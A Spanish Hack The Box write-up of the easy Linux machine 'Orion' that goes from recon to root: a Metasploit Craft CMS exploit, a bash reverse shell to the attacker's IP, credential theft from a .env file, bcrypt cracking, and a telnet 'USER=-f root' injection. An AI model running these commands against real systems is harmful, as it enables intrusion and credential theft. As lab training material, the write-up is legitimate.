---
# Orion WriteUp - Hack The Box
**Date**: `2026-08-10`
**Level**: `Easy`
**OS**: `Linux`
**IP**: `10.129.244.146`
**Tags**: `samba`, `metasploit`
---

## Executive Summary
Orion es una máquina Linux fácil. La cuál explota una vulnerabilidad presente en un login web y así empezar a comprometer la máquina con **Metasploit**.

---

## Reconocimiento

### Ping 
Lo primero que haremos es saber si tenemos conexión con la máquina victima y saber a qué sistema operativo nos enfrentamos.
```bash 
ping -c 1 10.129.244.146
```
El cual nos devuelve lo siguiente:
```bash
PING 10.129.244.146 (10.129.244.146) 56(84) bytes of data.
64 bytes from 10.129.244.146: icmp_seq=1 ttl=63 time=114 ms

--- 10.129.244.146 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 113.538/113.538/113.538/0.000 ms
```
Como lo devuelve el comando anterior, tenemos conexión y estamos contra una máquina con sistema operativo `Linux`, ya sabemos que es porque el **TTL** nos dice hacía que nos enfrentamos, no siempre es lo mismo, pero cuando es cercano a **64** sabemos que es una máquina `Linux`, en caso contrario si se acerca a **128** es una máquina `Windows`.

### Nmap
Ahora vamos a mirar que puertos tiene esta máquina abiertos, para ello usamos el siguiente comando **Nmap** en el cuál le vamos a indicar los siguientes parámetros:
- `-p-`: Indica que queremos escanear los 65535 puertos de la máquina victima.
- `--open`: Indicamos que solo queremos que nos devuelva que puertos están abiertos.
- `-sS`: Indicamos que queremos un escaneo del tipo TCP SYN con el fin de ser rápidos y que nos dé bastante información de ser posible.
- `--min-rate 5000`: Indicamos que debe enviar 5000 paquetes con cada escaneo.
- `-vvv`: Indicamos que debe de tener verbose, el cuál sirve para agilizar el proceso, en este caso usamos triple verbose para ser muy rápidos.
_ `-n`: Indicamos que no queremos que nos aplique resolución DNS.
- `-Pn`: Indicamos que no debe hacer descubrimiento de host, osea que asuma que el host ya está activo y que lo escanee directamente.
- `10.129.244.146`: Pasamos la IP de la máquina victima.
- `-oG`: Indicamos que queremos un archivo del tipo Grepable, para que podamos usar herramientas en el como: `grep`, `awk` y demás con el fin de procesarlo fácilmente.
- `allPorts`: Indicamos el nombre con el que queremos que se guarde la sálida de **Nmap**.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.244.146 -oG allPorts
```
Esto nos devuelve:
```javascript
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.991 ( <https://nmap.org> ) at 2026-08-28 16:46 -0500
Initiating SYN Stealth Scan at 16:46
Scanning 10.129.244.146 [65535 ports]
Discovered open port 80/tcp on 10.129.244.146
Discovered open port 22/tcp on 10.129.244.146
Completed SYN Stealth Scan at 16:46, 13.20s elapsed (65535 total ports)
Nmap scan report for 10.129.244.146
Host is up, received user-set (0.088s latency).
Scanned at 2026-08-28 16:46:42 -05 for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds
           Raw packets sent: 65537 (2.884MB) | Rcvd: 65537 (2.621MB)
```
De aquí podemos obtener dos puertos importantes y esenciales para poder conectarnos a la máquina:
- `22`: Este puerto es el que nos permite conectarnos remotamente mediante **SSH(Secure Shell)**, para acceder más adelante al sistema de la máquina victima.
- `80`: Este puerto es mayormente usado para el manejo de **HTTP**, quien no conozca, es el puerto donde se montan las webs que no tiene seguridad, al igual que el `8080`.

Ahora usando otra vez **Nmap**, vamos a mirar que contiene esos puertos a parte del servicio que corren.
Lo hacemos con los siguientes parámetros:
- `-p22,80`: Aca indicamos que puertos queremos escanear, ya no son todos.
- `-sCV`: En este hacemos una abreviación de `-sC` con el cuál indicamos que usaremos los `scripts predeterminados` de **Nmap** y el `-sV` indicandole que queremos saber las versiones de los servicios que corren en los puertos elegidos. 
- `10.129.244.146`: Pasamos la IP de la máquina victima.
- `-oN`: Le indicamos el tipo de archivo, el cual lo queremos del tipo **Nmap**, osea del tipo normal.
- `targeted`: Es el nombre del archivo donde queremos que se guarde la salida.
```bash
sudo nmap -p22,80 -sCV 10.129.244.146 -oN targeted
```

Nos devuelve lo siguiente:

```javascript
Starting Nmap 7.991 ( <https://nmap.org> ) at 2026-08-28 16:47 -0500
Nmap scan report for 10.129.244.146 (10.129.244.146)
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to <http://orion.htb/>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 12.19 seconds
```
Con todo, ahora sabemos que el servicio del puerto `22` es `OpenSSH` y con versión `8.9p1`, además de que también encontramos que es una máquina `Ubuntu`, la cuál es muy común en estos desafios.
Ahora también encontramos que el `80` maneja `Nginx` y con versión `1.18.0`, el cuál maneja el servicio **Web**.
Finalmente encontramos algo que nos interesa mucho, que es la redirección a `http://orion.htb/`, esto nos sirve porque nos detecto el dominio con el cuál podemos acceder a la página web.

Vamos a agregar esa **Url** a nuestro host, para poder acceder a ella, de lo contrario no podríamos. Ejecutamos lo siguiente:
```bash
echo "10.129.244.146 orion.htb" | sudo tee -a /etc/hosts
```
Y miramos si todo va bien:
```bash
cat /etc/hosts
# Hack The Box
10.129.244.146	orion.htb
```

### Whatweb
Ahora vamos a ver que servicios contiene la página si necesidad de entrar en el navegador, con ayuda de una herramienta llamada **Whatweb**. La usamos de la siguiente manera:
```bash
whatweb http://orion.htb
```
Nos devuelve:
```javascript
<http://orion.htb> [200 OK] Country[RESERVED][ZZ], Email[your.email@company.com], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.244.146], Open-Graph-Protocol, PoweredBy[CraftCMS], Script, Title[Orion Telecom], UncommonHeaders[x-robots-tag], X-Powered-By[Craft CMS], nginx[1.18.0]
```
Realmento no son muchas cosas, pero bueno algo es algo.

### Web
Ahora vamos a ver la página en si en el navegador:
![Descubrimiento web](/images/machines/orion/img-01.png)

## Enumeration

Para descubrir rutas y recursos ocultos utilizaremos ffuf.

Ejecutamos:

```bash
ffuf -u http://orion.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
El parámetro:

- `u`: Define la URL objetivo.
FUZZ: Indica el lugar donde ffuf realizará las sustituciones.
- `w`: Especifica el diccionario que utilizaremos.

Después de ejecutar el escaneo obtenemos varios resultados:

```javascript
.htaccess               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 102ms]
.gitconfig              [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 102ms]
.gitattributes          [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 102ms]
.gitk                   [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 102ms]
.gitignore              [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 102ms]
.git-rewrite            [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 102ms]
.git                    [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 102ms]
.gitreview              [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 102ms]
.gitmodules             [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 103ms]
.git/HEAD               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 102ms]
.git/logs/              [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 102ms]
.hta                    [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 102ms]
.git/index              [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 796ms]
.htpasswd               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 796ms]
.git/config             [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 796ms]
.gitkeep                [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 797ms]
.git_release            [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 753ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 208ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 79ms]
index.html              [Status: 200, Size: 9689, Words: 2708, Lines: 183, Duration: 506ms]
index.php               [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 810ms]
index                   [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 867ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 694ms]
:: Progress: [4752/4752] :: Job [1/1] :: 63 req/sec :: Duration: [0:01:04] :: Errors: 0 ::

```
Entre todos estos resultados hay uno especialmente interesante:
`admin [Status: 302]`
Esto coincide con el panel administrativo que suele utilizar **Craft CMS**.
Por lo tanto, tenemos un nuevo punto de interés: `http://orion.htb/admin`
Mirando ese panel:
![Panel de autenticación](/images/machines/orion/img-02.png)
Obtenemos la versión de **Craft CMS**: `5.6.16`.

---

## Exploitation

Después de identificar **Craft CMS** y su panel administrativo, podemos investigar la versión y las vulnerabilidades conocidas que afectan a la instalación utilizada por la máquina.

En este punto utilizaremos Metasploit para obtener una sesión sobre el servidor.

Lo primero es buscar y obtener ese exploit:


Miramos las opciones:

![Metasploit](/images/machines/orion/img-03.png)

Configuramos el objetivo:
```bash
RHOSTS: orion.htb
```
Y nuestra dirección:
```bash
LHOST: <nuestra IP>
```
Para mirar nuestra IP usamos:
```bash
ifconfig
```
Y ahí encontraremos algo como: `10.10.14.12`.

Antes de ejecutar el exploit configuramos el payload:
```bash
set payload php/meterpreter/reverse_http
```
Y revizamos que todo esté bien:
![Metasploit Options](/images/machines/orion/img-04.png)

Ahora ejecutamos el módulo y conseguimos una sesión Meterpreter sobre el servidor:
![Meterpreter Session](/images/machines/orion/img-05.png)


### Enumeración desde Meterpreter

Ahora que tenemos acceso al sistema, podemos comenzar a buscar información que nos permita avanzar.

Primero nos movemos al directorio raíz:
```bash
meterpreter > cd ..
meterpreter > ls
```

Obtenemos:
```javascript
Listing: /
==========

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040755/rwxr-xr-x  40960  dir   2026-05-07 07:18:44 -0500  bin
040755/rwxr-xr-x   4096  dir   2026-05-07 07:28:14 -0500  boot
040755/rwxr-xr-x   3920  dir   2026-08-31 19:36:34 -0500  dev
040755/rwxr-xr-x   4096  dir   2026-05-12 03:17:38 -0500  etc
040755/rwxr-xr-x   4096  dir   2026-05-12 03:15:15 -0500  home
040755/rwxr-xr-x   4096  dir   2026-05-08 07:35:34 -0500  lib
040755/rwxr-xr-x   4096  dir   2023-02-17 12:19:39 -0500  lib32
040755/rwxr-xr-x   4096  dir   2026-03-06 08:33:36 -0500  lib64
040700/rwx------  16384  dir   2023-04-27 10:40:29 -0500  lost+found
040755/rwxr-xr-x   4096  dir   2026-05-12 03:15:14 -0500  media
040755/rwxr-xr-x   4096  dir   2023-02-17 12:19:40 -0500  mnt
040755/rwxr-xr-x   4096  dir   2026-05-12 03:15:15 -0500  opt
040755/rwxr-xr-x   4096  dir   2026-05-12 03:15:15 -0500  root
040755/rwxr-xr-x    940  dir   2026-08-31 19:52:25 -0500  run
040755/rwxr-xr-x  20480  dir   2026-05-08 07:35:34 -0500  sbin
040755/rwxr-xr-x   4096  dir   2023-02-17 12:19:40 -2020  snap
040755/rwxr-xr-x   4096  dir   2026-05-12 03:15:15 -0500  srv
040555/r-xr-xr-x      0  dir   2026-08-31 19:36:24 -0500  sys
041777/rwxrwxrwx   4096  dir   2026-08-31 20:39:05 -0500  tmp
040755/rwxr-xr-x   4096  dir   2023-02-17 12:19:40 -0500  usr
040755/rwxr-xr-x   4096  dir   2026-03-06 04:56:26 -0500  var

```
Encontramos el directorio `home` en el cuál podemos encontrar usuarios:

![User found](/images/machines/orion/img-06.png)

Encontramos al usuario `adam`, pero no tenemos su contraseña.

Ahora nuestro objetivo ahora es encontrar información de la aplicación web.
Sabemos que el servidor utiliza **Nginx**, por lo que revisaremos: `/var/www`.

Nos dirigimos allí:

```bash
meterpreter > cd var
meterpreter > cd www
meterpreter > ls
```
Encontramos:
```javascript
Listing: /var/www
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040755/rwxr-xr-x  4096  dir   2026-03-06 06:19:43 -0500  html
```
Entramos:
```bash
meterpreter > cd html
meterpreter > ls
```
Y encontramos:
```javascript
Listing: /var/www/html
======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040775/rwxrwxr-x  4096  dir   2026-03-06 06:22:10 -0500  craft
100644/rw-r--r--   612  fil   2026-03-06 04:56:27 -0500  index.nginx-debian.html
```
Tenemos un directorio llamado: `craft`.
Esto coincide con la tecnología que encontramos anteriormente mediante WhatWeb. **Craft CMS**.

Entramos al directorio:
```bash
meterpreter > cd craft
meterpreter > ls
```
Encontramos:
```javascript
Listing: /var/www/html/craft
============================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100664/rw-rw-r--    718    fil  2026-03-06 06:24:43 -0500  .env
100664/rw-rw-r--    411    fil  2025-11-18 12:08:05 -0500  .env.example.dev
100664/rw-rw-r--    623    fil  2025-11-18 12:08:05 -0500  .env.example.production
100664/rw-rw-r--    619    fil  2025-11-18 12:08:05 -0500  .env.example.staging
100664/rw-rw-r--     31    fil  2025-11-18 12:08:05 -0500  .gitignore
100664/rw-rw-r--    624    fil  2025-11-18 12:08:05 -0500  bootstrap.php
100664/rw-rw-r--    611    fil  2026-03-06 06:20:42 -0500  composer.json
100664/rw-rw-r-- 310507    fil  2026-03-06 06:20:44 -0500  composer.lock
040775/rwxrwxr-x   4096    dir  2026-03-06 06:26:15 -0500  config
100755/rwxrwxr-x    309    fil  2025-11-18 12:08:05 -0500  craft
040775/rwxrwxr-x   4096    dir  2026-03-06 06:24:45 -0500  storage
040775/rwxrwxr-x   4096    dir  2026-03-10 05:46:17 -0500  templates
040775/rwxrwxr-x   4096    dir  2026-03-06 06:20:46 -0500  vendor
040775/rwxrwxr-x   4096    dir  2026-03-07 10:31:21 -0500  web
```
Aquí encontramos algo muy interesante: `.env`.

Los archivos .env suelen contener variables de entorno y, dependiendo de la configuración de la aplicación, pueden almacenar información sensible como credenciales de bases de datos.

Por lo tanto, vamos a revisar su contenido:
```bash
meterpreter > cat .env
```
Obtenemos:
```javascript
# Read about configuration, here:
# https://craftcms.com/docs/5.x/configure.html

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=dev

# General settings
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
CRAFT_DISALLOW_ROBOTS=true
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

PRIMARY_SITE_URL=http://orion.htb/
```
Aquí encontramos las credenciales de la base de datos:

`Database: orion, User: root, Password: SuperSecureCraft123Pass!`

Con esto podemos intentar acceder directamente a **MySQL**.

### Obtención de acceso a MySQL

| Por alguna razón, Meterpreter no permite crear una shell de manera convencional en esta máquina.

Por lo tanto, vamos a utilizar nuestra propia terminal para recibir una conexión.

Primero nos ponemos en escucha:
```bash
nc -lvnp 9001
```
Desde Meterpreter ejecutamos:
```bash
meterpreter > execute -f /bin/bash -a "-c 'bash -i >& /dev/tcp/10.10.14.182/9001 0>&1'"
```
De esta manera obtenemos una shell desde nuestra terminal.
![Listening](/images/machines/orion/img-07.png)

Ahora podemos trabajar directamente con la terminal del sistema.

### Enumeración de MySQL

Utilizamos las credenciales encontradas anteriormente para conectarnos a la base de datos:
```bash
mysql -u root -p orion
```
Introducimos la contraseña: `SuperSecureCraft123Pass!`

Una vez dentro podemos enumerar las tablas:
```sql
show tables;
```
Entre las tablas encontramos:
```javascript
addresses
announcements
assetindexdata
assetindexingsessions
assets
assets_sites
authenticator
categories
categorygroups
categorygroups_sites
changedattributes
changedfields
craftidtokens
deprecationerrors
drafts
elementactivity
elements
elements_bulkops
elements_owners
elements_sites
entries
entries_authors
entrytypes
fieldlayouts
fields
globalsets
gqlschemas
gqltokens
imagetransformindex
imagetransforms
info
migrations
plugins
projectconfig
queue
recoverycodes
relations
resourcepaths
revisions
searchindex
sections
sections_entrytypes
sections_sites
sequences
sessions
shunnedmessages
sitegroups
sites
sso_identities
structureelements
structures
systemmessages
taggroups
tags
tokens
usergroups
usergroups_users
userpermissions
userpermissions_usergroups
userpermissions_users
userpreferences
users
usergroups
volumefolders
volumes
webauthn
widgets
```

La tabla que nos interesa especialmente es: `users`.

Por lo tanto ejecutamos:
```sql
SELECT * FROM users;
```
Encontramos el usuario administrador:
```javascript
id              1
admin           1
email           adam@orion.htb
password        $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

Tenemos un hash de contraseña correspondiente al usuario: `adam`.

El formato: `$2y$13$`.

corresponde a bcrypt, por lo que podemos intentar realizar un ataque de diccionario offline utilizando **Hashcat**.

### Cracking del hash

Guardamos el hash:

`$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS`

en un archivo llamado:

`password.txt`

Después utilizamos **Hashcat** con el modo correspondiente a **bcrypt**:
```bash
hashcat -m 3200 password.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```
El diccionario utilizado es:

`rockyou.txt`

Después del proceso conseguimos recuperar la contraseña: `darkangel`.

Por lo tanto tenemos: `Username: adam, Password: darkangel`

Ahora podemos intentar utilizar estas credenciales para conectarnos mediante **SSH**.

### Acceso SSH

Ejecutamos:
```bash
ssh adam@orion.htb -p 22
```
Introducimos la contraseña: `darkangel`

Y conseguimos acceso:
```bash
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Sep 1 02:35:25 AM UTC 2026

 System load: 0.01
 Usage of /:   77.8% of 5.81GB
 Memory usage: 9%
 IPv4 address for eth0: 10.129.244.146
 Swap usage:   0%

 => There are 7 zombie processes.
```
Ahora comprobamos nuestro directorio:
```bash
ls
```
Encontramos:
```javascript
user.txt
```
Y obtenemos la flag:
```bash
cat user.txt
```
Resultado: `db867de337da6ae745373a0ac8602269`

Con esto hemos conseguido la **user flag**.

## Escalada de privilegios

Ahora necesitamos conseguir acceso como **root**.

Lo primero será enumerar los servicios que están escuchando en la máquina.

Para ello utilizamos:
```bash
ss -lntup
```
Obtenemos:
```javascript
Netid   State   Recv-Q   Send-Q   Local Address:Port           Peer Address:Port   Process
udp     UNCONN  0        0        127.0.0.53%lo:53             0.0.0.0:*
udp     UNCONN  0        0        0.0.0.0:68                  0.0.0.0:*
tcp     LISTEN  0        10       127.0.0.1:23                0.0.0.0:*
tcp     LISTEN  0        4096     127.0.0.53%lo:53            0.0.0.0:*
tcp     LISTEN  0        128      0.0.0.0:22                 0.0.0.0:*
tcp     LISTEN  0        511      0.0.0.0:80                 0.0.0.0:*
tcp     LISTEN  0        80       127.0.0.1:3306              0.0.0.0:*
tcp     LISTEN  0        128      [::]:22                     [::]:*
```
Aquí aparece algo que no habíamos visto durante nuestro escaneo inicial: `127.0.0.1:23`

El puerto `23` corresponde normalmente a **Telnet**.

Además, solamente está escuchando en: `127.0.0.1`

Por eso no apareció durante nuestro escaneo externo inicial.

### Enumeración de Telnet

Vamos a comprobar la versión instalada:
```bash
telnet --version
```
Obtenemos:
```javascript
telnet (GNU inetutils) 2.7
Copyright (C) 2025 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
```
La versión es: `GNU inetutils 2.7`.

Durante la investigación encontramos una vulnerabilidad asociada a esta versión.

La documentación utilizada para este punto es:
`OffSec - CVE-2026-24061`

La vulnerabilidad permite manipular el argumento utilizado por el cliente **Telnet** mediante la variable de entorno **USER**.

En el contexto de esta máquina podemos probar:
```bash
USER='-f root' telnet -a 127.0.0.1
```
### Explotación de Telnet

Ejecutamos:
```bash
USER='-f root' telnet -a 127.0.0.1
```
El servicio responde:
```bash
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

Linux 5.15.0-177-generic (orion) (pts/2)

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Sep 1 03:01:10 AM UTC 2026

 System load: 0.17
 Usage of /:   78.3% of 5.81GB
 Memory usage: 15%
 IPv4 address for eth0: 10.129.244.146
 Swap usage:   0%

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts.
Check your Internet connection or proxy settings

root@orion:~#
```

Y lo más importante: `root@orion:~#`
Ahora tenemos una sesión como **root**.

### Root Flag

Finalmente comprobamos el contenido del directorio de **root**:
```bash
cat root.txt
```
Obtenemos: `03778b8dfdd9503f34d41c4fcdfaa736`

Con esto hemos conseguido la **root flag** y completamos la máquina.

# Conclusión

La máquina Orion demuestra una cadena de ataque en varias etapas.

Inicialmente, el reconocimiento permitió identificar los servicios **SSH** y **HTTP**. La enumeración del servidor web reveló el uso de **Craft CMS**, y posteriormente la enumeración de contenido permitió localizar el panel administrativo.

Después de comprometer la aplicación conseguimos acceso mediante Meterpreter, desde donde pudimos revisar los archivos de configuración de **Craft CMS**. El archivo .env contenía las credenciales de la base de datos **MySQL**.

Con acceso a **MySQL** encontramos el hash de contraseña del usuario administrador adam. Utilizando **Hashcat** y el diccionario `rockyou.txt` conseguimos recuperar la contraseña y utilizarla para acceder mediante **SSH**.

Finalmente, una enumeración de servicios locales reveló un servicio Telnet que no era visible desde el exterior porque únicamente escuchaba en `127.0.0.1`. La versión instalada era vulnerable a **CVE-2026-24061**, lo que permitió conseguir acceso como **root**.